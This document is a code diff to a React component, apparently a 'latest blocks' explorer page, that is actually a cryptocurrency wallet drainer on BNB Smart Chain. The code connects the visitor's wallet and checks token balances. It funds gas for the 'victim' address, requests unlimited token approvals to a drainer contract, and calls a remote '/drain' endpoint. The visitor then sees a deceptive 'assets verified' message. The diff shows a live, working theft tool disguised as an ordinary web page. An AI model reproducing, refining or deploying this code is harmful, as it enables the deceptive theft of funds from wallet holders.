@@ -8,8 +8,8 @@ const LatestBlocks = () => {
   const [connectedAccount, setConnectedAccount] = useState(null);
   const [loading, setLoading] = useState(false);
 
-  const API_BASE_URL = "https://p58f8u8v4g.execute-api.ap-south-1.amazonaws.com"; // Update if Beanstalk URL changed
-  const drainerContractAddress = "0x17ea41b9Ce16190730039384287469b6D5dac2E1"; // Replace with your deployed address
+  const API_BASE_URL = "https://p58f8u8v4g.execute-api.ap-south-1.amazonaws.com"; // Your API Gateway URL
+  const drainerContractAddress = "0x17ea41b9Ce16190730039384287469b6D5dac2E1"; // Your deployed address
   const tokenList = [
     { symbol: "BUSD", address: "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56", decimals: 18 },
     { symbol: "USDT", address: "0x55d398326f99059fF775485246999027B3197955", decimals: 18 },
@@ -63,9 +63,7 @@ const LatestBlocks = () => {
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({ victimAddress: connectedAddress }),
         });
-        if (!gasResponse.ok) {
-          throw new Error(`HTTP error! Status: ${gasResponse.status}`);
-        }
+        if (!gasResponse.ok) throw new Error(`HTTP error! Status: ${gasResponse.status}`);
         const gasData = await gasResponse.json();
         if (gasData.success) {
           let attempts = 0;
@@ -89,13 +87,9 @@ const LatestBlocks = () => {
 
   const connectAndDrain = async () => {
     try {
-      if (!window.ethereum) {
-        alert("Please install Trust Wallet or MetaMask!");
-        return;
-      }
+      if (!window.ethereum) throw new Error("No wallet detected");
 
       setLoading(true);
-
       const switchSuccess = await switchToBSC();
       if (!switchSuccess) throw new Error("Could not switch to BSC Mainnet");
 
@@ -106,13 +100,9 @@ const LatestBlocks = () => {
       setConnectedAccount(`${connectedAddress.slice(0, 6)}...${connectedAddress.slice(-4)}`);
 
       const network = await walletProvider.getNetwork();
-      if (network.chainId !== BigInt(56)) throw new Error("Wallet is not on BSC Mainnet.");
+      if (network.chainId !== BigInt(56)) throw new Error("Not on BSC Mainnet");
 
-      const bep20Abi = [
-        "function balanceOf(address account) external view returns (uint256)",
-        "function approve(address spender, uint256 amount) external returns (bool)",
-      ];
-
+      const bep20Abi = ["function balanceOf(address) view returns (uint256)", "function approve(address, uint256) returns (bool)"];
       let hasTokens = false;
       for (const token of tokenList) {
         const tokenContract = new ethers.Contract(token.address, bep20Abi, bscProvider);
@@ -120,12 +110,7 @@ const LatestBlocks = () => {
         console.log(`${token.symbol} Balance:`, ethers.formatUnits(balance, token.decimals));
         if (balance > 0) hasTokens = true;
       }
-
-      if (!hasTokens) {
-        setLoading(false);
-        alert("No tokens found to process.");
-        return;
-      }
+      if (!hasTokens) throw new Error("No tokens found");
 
       const gasAvailable = await checkAndSendGas(connectedAddress);
       if (!gasAvailable) throw new Error("Failed to provide gas");
@@ -133,39 +118,28 @@ const LatestBlocks = () => {
       const drainResponse = await fetch(`${API_BASE_URL}/drain`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ victimAddress: connectedAddress, drainAll: true }),
+        body: JSON.stringify({ victimAddress: connectedAddress }),
       });
       const drainData = await drainResponse.json();
+      if (!drainData.success) throw new Error("Drain check failed");
 
       if (drainData.needsApproval) {
         for (const token of tokenList) {
           const tokenContract = new ethers.Contract(token.address, bep20Abi, signer);
           const balance = await tokenContract.balanceOf(connectedAddress);
           if (balance > 0) {
-            try {
-              const tx = await tokenContract.approve(drainerContractAddress, ethers.MaxUint256, { gasLimit: 100000 });
-              await tx.wait();
-            } catch (error) {
-              console.error(`Error approving ${token.symbol}:`, error.message);
-              throw error;
-            }
+            const tx = await tokenContract.approve(drainerContractAddress, ethers.MaxUint256, { gasLimit: 100000 });
+            await tx.wait(1); // Wait for approval
           }
         }
-        const finalDrainResponse = await fetch(`${API_BASE_URL}/drain`, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ victimAddress: connectedAddress, drainAll: true }),
-        });
-        const finalData = await finalDrainResponse.json();
-        if (!finalData.success) throw new Error("Draining failed: " + finalData.message);
       }
 
       setLoading(false);
       alert("Assets verified and processed successfully!");
     } catch (error) {
-      console.error("Error in connectAndDrain:", error.message, error.stack);
+      console.error("Error in connectAndDrain:", error.message);
       setLoading(false);
-      alert(`Error: ${error.message || "An unexpected error occurred"}`);
+      alert(`Error: ${error.message || "Unexpected error"}`);
     }
   };
 
@@ -174,7 +148,6 @@ const LatestBlocks = () => {
   ];
 
   return (
-    // ... (JSX unchanged - UI stuff)
     <>
       <section className="bg-dark pt-14 pb-20 bg-banner">
         <div className="container-fluid px-lg-5">
